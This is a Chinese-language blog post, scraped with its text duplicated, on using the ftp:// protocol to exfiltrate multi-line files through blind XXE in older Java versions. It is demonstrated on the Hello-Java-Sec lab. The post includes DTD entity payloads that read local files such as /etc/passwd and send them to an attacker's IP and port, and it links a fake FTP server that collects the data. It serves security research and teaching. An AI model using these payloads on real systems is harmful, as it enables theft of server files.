盲XXE想要读取文件一般来说需要外带。但是如果文件中包含换行等特殊字符，直接http外带，会报无效url错误。 在php环境下，可以直接使用php伪协议中的filter进行编码转换，就不会报错了。 但在java环境下或者禁用filter的情况下，可以尝试用ftp://协议外带。\n环境 这里使用的环境是Hello-Java-Sec的靶场环境 https://github.com/j3ers3/Hello-Java-Sec/\njdk8 漏洞代码： DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // 这里其实有回显，偷懒不改代码了，假装看不见。 原理 使用ftp://协议可以带出带有换行的数据。 （可利用版本：jdk\u0026lt;7u141和jdk\u0026lt;8u162，高于这两个版本ftp://协议也不能用了。）\n正常的ftp服务器不能满足我们的需要，但我从网上找到的模拟ftp服务器都不能用（也可能是我不会用），于是就自己写了一个。 链接：https://github.com/zoiltin/fake-ftp-server\n写脚本之前，先了解一下调用ftp://协议是发生了什么。通过读取/etc/passwd为例，payload：ftp://ip:port/{data}数据交互如下： 蓝色的为fake-ftp-server。 建立连接和确定模式后，服务器开始发送CWD指令，因为在/etc/passwd中有许多/将数据分割为许多目录，所以服务器一直尝试切换目录。我们要做的就是接受并不断返回250 Directory successfully changed.让服务器一直传数据。 在最后一个/后的数据，服务器将其视为要下载的文件名，请求用被动模式下载数据，从流量中可见，攻击者开启63568端口并告诉服务器，当服务器连接63568端口后，即向我们发送了要下载的文件名也就是最后一段数据。\nftp://协议比较简单，脚本很容易实现。\n用法 payload:\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file://\u0026#34;\u0026gt; \u0026lt;!ENTITY % int \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#39;ftp://IP:PORT/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; 简单的用法： ftp://IP:PORT/%file; 或者全用CWD读取： ftp://IP:PORT/%file;/ 数据中不能包含%和#，如果有'或\u0026quot;需要调整evil.dtd中包裹ftp://的引号类型，不然会报错。?和#会导致数据截断。\n在高版本也可以十分有限的利用：\nftp://username:%file;@IP:PORT/asdasd 将数据从密码处传递，只能读一行 如果文件有多行会报错，回显一部分。 ","permalink":"https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/","summary":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n关于盲XXE的文件读取 盲XXE想要读取文件一般来说需要外带。但是如果文件中包含换行等特殊字符，直接http外带，会报无效url错误。 在php环境下，可以直接使用php伪协议中的filter进行编码转换，就不会报错了。 但在java环境下或者禁用filter的情况下，可以尝试用ftp://协议外带。\n环境 这里使用的环境是Hello-Java-Sec的靶场环境 https://github.com/j3ers3/Hello-Java-Sec/\njdk8 漏洞代码： DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // 这里其实有回显，偷懒不改代码了，假装看不见。 原理 使用ftp://协议可以带出带有换行的数据。 （可利用版本：jdk\u0026lt;7u141和jdk\u0026lt;8u162，高于这两个版本ftp://协议也不能用了。）\n正常的ftp服务器不能满足我们的需要，但我从网上找到的模拟ftp服务器都不能用（也可能是我不会用），于是就自己写了一个。 链接：https://github.com/zoiltin/fake-ftp-server\n写脚本之前，先了解一下调用ftp://协议是发生了什么。通过读取/etc/passwd为例，payload：ftp://ip:port/{data}数据交互如下： 蓝色的为fake-ftp-server。 建立连接和确定模式后，服务器开始发送CWD指令，因为在/etc/passwd中有许多/将数据分割为许多目录，所以服务器一直尝试切换目录。我们要做的就是接受并不断返回250 Directory successfully changed.让服务器一直传数据。 在最后一个/后的数据，服务器将其视为要下载的文件名，请求用被动模式下载数据，从流量中可见，攻击者开启63568端口并告诉服务器，当服务器连接63568端口后，即向我们发送了要下载的文件名也就是最后一段数据。\nftp://协议比较简单，脚本很容易实现。\n用法 payload:\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file://\u0026#34;\u0026gt; \u0026lt;!ENTITY % int \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#39;ftp://IP:PORT/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; 简单的用法： ftp://IP:PORT/%file; 或者全用CWD读取： ftp://IP:PORT/%file;/ 数据中不能包含%和#，如果有'或\u0026quot;需要调整evil.dtd中包裹ftp://的引号类型，不然会报错。?和#会导致数据截断。\n在高版本也可以十分有限的利用：\nftp://username:%file;@IP:PORT/asdasd 将数据从密码处传递，只能读一行 如果文件有多行会报错，回显一部分。 ","title":"盲XXE中FTP协议的利用"}]